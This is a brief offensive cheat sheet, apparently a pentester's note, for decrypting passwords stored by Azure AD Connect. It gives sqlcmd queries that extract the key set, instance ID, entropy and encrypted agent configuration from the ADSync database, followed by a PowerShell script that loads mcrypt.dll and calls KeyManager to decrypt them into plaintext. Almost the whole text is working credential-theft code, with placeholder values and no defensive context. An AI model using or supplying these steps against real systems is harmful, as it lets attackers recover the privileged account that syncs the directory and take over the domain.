# decrypt azure AD connect passwords
## powershell MSSQL queries
https://github.com/fox-it/adconnectdump
changing database source to MSSQL using sqlcmd powershell alias
```powershell
sqlcmd -Q "SELECT keyset_id, instance_id, entropy FROM ADSync.dbo.mms_server_configuration"
keyset_id   instance_id                          entropy
----------- ------------------------------------ ------------------------------------
          1 AAAAAAAA-AAAA-AAAA-AAAA-AAAAAAAAAAAA BBBBBBBB-BBBB-BBBB-BBBB-BBBBBBBBBBBB

(1 rows affected)

sqlcmd -y 8000 -Q "SELECT encrypted_configuration FROM ADSync.dbo.mms_management_agent WHERE ma_type = 'AD'"
encrypted_configuration
--------------------------------------------------------------------------------------------------------------
BASE64BASE64BASE64
```

```powershell
$key_id = 1
$instance_id = [System.guid]::New("AAAAAAAA-AAAA-AAAA-AAAA-AAAAAAAAAAAA")
$entropy = [System.guid]::New("BBBBBBBB-BBBB-BBBB-BBBB-BBBBBBBBBBBB")

$crypted = "BASE64BASE64BASE64"

add-type -path 'C:\Program Files\Microsoft Azure AD Sync\Bin\mcrypt.dll'
$km = New-Object -TypeName Microsoft.DirectoryServices.MetadirectoryServices.Cryptography.KeyManager
$km.LoadKeySet($entropy, $instance_id, $key_id)
$key = $null
$km.GetActiveCredentialKey([ref]$key)
$key2 = $null
$km.GetKey(1, [ref]$key2)
$decrypted = $null
$key2.DecryptBase64ToString($crypted, [ref]$decrypted)

echo $decrypted
```
